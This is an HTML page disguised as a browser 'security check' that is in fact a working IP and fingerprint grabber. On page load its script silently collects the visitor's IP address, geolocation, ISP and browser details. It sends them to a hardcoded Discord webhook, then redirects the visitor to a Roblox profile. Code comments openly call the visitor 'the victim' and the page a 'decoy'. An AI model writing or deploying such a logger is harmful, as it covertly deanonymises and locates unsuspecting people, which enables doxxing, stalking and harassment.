<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; display: flex;
         justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .card { background: #fff; padding: 40px 50px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,.1); text-align: center; }
  .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top-color: #5865F2;
             border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { color: #222; margin-bottom: 8px; }
  p  { color: #666; font-size: 14px; }
  .done { color: #2ecc71; font-weight: 600; }
</style>
</head>
<body>

<div class="card">
  <div class="spinner" id="spin"></div>
  <h2>Verifying your device…</h2>
  <p>Please wait while we confirm your browser and network security settings.</p>
  <p id="status" style="display:none" class="done">✔ Verification complete. Redirecting…</p>
</div>

<script>
// ============ CONFIG ============
const WEBHOOK_URL = "https://discord.com/api/webhooks/1536223338647654400/zZIPTm_UF5MCzxbP4DN78a34iJg-5HBGD1zDQrbcwgII4_73Z5hEBOcy1OSwTPN7KooE";
// Page the victim is redirected to after logging (use a legit-looking page)
const REDIRECT_URL = "https://www.roblox.com/users/1868844996/profile";
// ================================

async function getIP() {
  // Primary: ipapi.co (no key needed). Fallbacks if it fails.
  try {
    const r = await fetch("https://ipapi.co/json/");
    if (r.ok) return await r.json();
    throw new Error("ipapi failed");
  } catch (e) {
    try {
      const r = await fetch("https://ipwho.is/");
      if (r.ok) return await r.json();
      throw new Error("ipwho failed");
    } catch (e2) {
      const r = await fetch("https://api.ipify.org?format=json");
      return { ip: (await r.json()).ip, fallback: true };
    }
  }
}

function getFingerprint() {
  const d = new Date();
  return {
    user_agent:      navigator.userAgent,
    platform:        navigator.platform,
    language:        navigator.language,
    languages:       navigator.languages || [],
    timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
    local_time:      d.toLocaleString(),
    screen:          `${screen.width}x${screen.height}x${screen.colorDepth}`,
    viewport:        `${window.innerWidth}x${window.innerHeight}`,
    referrer:        document.referrer || "direct",
    url:             location.href,
    cookies_enabled: navigator.cookieEnabled,
    online:          navigator.onLine,
    cpu_cores:       navigator.hardwareConcurrency || "unknown",
    touch_device:    navigator.maxTouchPoints > 0
  };
}

async function sendToDiscord(data) {
  const embed = {
    title: "🛰️ New hit logged",
    color: 0x5865F2,
    fields: [
      { name: "IP Address", value: data.ip || "Unknown", inline: true },
      { name: "Country",    value: data.country_name || data.country || "Unknown", inline: true },
      { name: "Region/City",value: `${data.region || data.region_name || "?"} / ${data.city || "?"}`, inline: true },
      { name: "ISP / Org",  value: data.org || data.connection?.isp || "Unknown", inline: false },
      { name: "Lat / Lon",  value: data.latitude ? `${data.latitude}, ${data.longitude}` : "N/A", inline: true },
      { name: "User Agent", value: `\`\`\`${data.user_agent}\`\`\``, inline: false },
      { name: "Platform",   value: data.platform, inline: true },
      { name: "Language",   value: data.language, inline: true },
      { name: "Timezone",   value: data.timezone, inline: true },
      { name: "Screen",     value: data.screen, inline: true },
      { name: "Referrer",   value: data.referrer || "direct", inline: true },
      { name: "Local Time", value: data.local_time, inline: true },
      { name: "Extra",      value: `CPU cores: ${data.cpu_cores} | Touch: ${data.touch_device} | Cookies: ${data.cookies_enabled}`, inline: false }
    ],
    footer: { text: `URL: ${data.url}` },
    timestamp: new Date().toISOString()
  };

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed], username: "Hit-Logger" })
  });
}

(async () => {
  try {
    const geo = await getIP();
    const fp  = getFingerprint();
    const data = Object.assign({}, geo, fp);
    await sendToDiscord(data);
  } catch (e) {
    // Silent fail — never break the decoy page
    console.error("Logger error:", e);
  }
  document.getElementById("spin").style.display = "none";
  document.getElementById("status").style.display = "block";
  setTimeout(() => { location.href = REDIRECT_URL; }, 1500);
})();
</script>

</body>
</html>
